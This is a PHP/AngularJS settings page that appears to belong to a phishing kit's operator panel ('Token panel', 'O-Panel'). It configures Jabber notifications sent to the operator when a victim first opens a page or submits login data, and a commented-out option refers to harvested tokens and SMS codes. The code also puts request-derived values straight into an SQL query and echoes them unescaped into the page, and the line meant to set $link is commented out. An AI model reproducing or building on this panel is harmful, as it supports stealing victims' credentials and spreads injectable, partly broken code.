<?php
if(!defined('UADMIN_AB_ROOT')){die("You not have permisions");}



$ui=$_GET['ui'];


// 

// $link=$_GET['jab_cog'];


$jns=$sql->query("select jabs,sendon from opt where link='$link' limit 1")->fetchArray(SQLITE3_ASSOC);
$jns['sendon']=json_decode($jns['sendon']);
$jns['jabs']=json_decode($jns['jabs']);

// 




?>
<script type="text/javascript" src="bower_components/checklist-model/checklist-model.js"></script>
<script type="text/javascript">
php_js.jns = <?php echo json_encode($jns); ?>;
</script>
<div class="container-fluid mt-2">
    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="<?php echo $k_plugin->ajax_url ?>">Token panel</a></li>
            <li class="breadcrumb-item"><a href="<?php echo $k_plugin->ajax_url; ?>&ui=<?php echo $ui; ?>">O-Panel</a></li>
            <li class="breadcrumb-item active" >Alerts settings for <b><?php echo $link; ?></b></li>
        </ol>
    </nav>
</div>
<div class="container" style="" ng-app="app" ng-controller="jns-ctrl">
    
    
    <h3>
        Send jabber on ...
    </h3>
   
       
            <div class="checkbox">
                <label>
                    <input type="checkbox" checklist-model="jns.sendon" value="page_reg">
                    ... first page load <i class="fa fa-question-circle-o text-warning" data-toggle="popover" title="Help" data-content="When user enter page first time before any actions"></i>
                </label>
            </div>
            
       
        
            <div class="checkbox">
                <label>
                    <input type="checkbox" checklist-model="jns.sendon" value="keys">
                     ... login data received <i class="fa fa-question-circle-o text-warning" data-toggle="popover" title="Help" data-content="When user send Logins data"></i>
                </label>
            </div>
            
        
        <!-- <div class="col-sm-4 " style="">
                <div class="checkbox">
                    <label>
                        <input type="checkbox" checklist-model="jns.sendon" value="data" >
                        <?php echo __('On Dynamic data received')?>
                    </label>
                </div>
                
                <small class="text-muted">When user send all requested data like tokens,sms...</small>
            </div> -->
   
 
    <h3 class="mt-3">Send jabber to...  </h3><small class="pull-right"> jab1,jab2,jab3...</small>
    <textarea name="jabs" id="jabs" cols="30" ng-model="jns.jabs" ng-list class="form-control"></textarea>
   



   <div class="clearfix mt-2">
      
            <a class="btn btn-outline-success" ng-click="test()">  Test</a>
            <button class="btn btn-outline-info float-right" ng-click="save_jabs()" style="">Save</button>
      
   </div>
    
</div>
<script type="text/javascript">
/**
 *  Module
 *
 * Description
 */
app = angular.module('app', ['checklist-model'])
app.controller('jns-ctrl', function($scope) {
    window.scope = $scope;


    $scope.jns = php_js.jns




    $scope.save_jabs = function() {


        show_loader__()
        $.ajax({
            url: php_js.k_plugin.ajax_url + "&save_jabs",
            dataType: "json",
            data: {
                link: '<?php echo $link ?>',
                sendon: $scope.jns.sendon,
                jabs: $scope.jns.jabs
            },
            success: function(res) {
                hide_loader__()
                notify(res.res)
            },
            error: function(err) {
                hide_loader__()
                error(err.responseText)
            }
        })
    }


    $scope.test = function() {


        show_loader__()
        $.ajax({
            url: php_js.k_plugin.ajax_url + "&test_jabs",
            dataType: "json",
            data: {
                jabs: $scope.jns.jabs
            },
            success: function(res) {
                hide_loader__()
                notify(res.res)
            },
            error: function(err) {
                hide_loader__()
                error(err.responseText)
            }
        })
    }

})
</script>
<!--  -->
<!--  -->
<!--  -->
<!--  -->
<!--  -->
<!--  -->
<!--  -->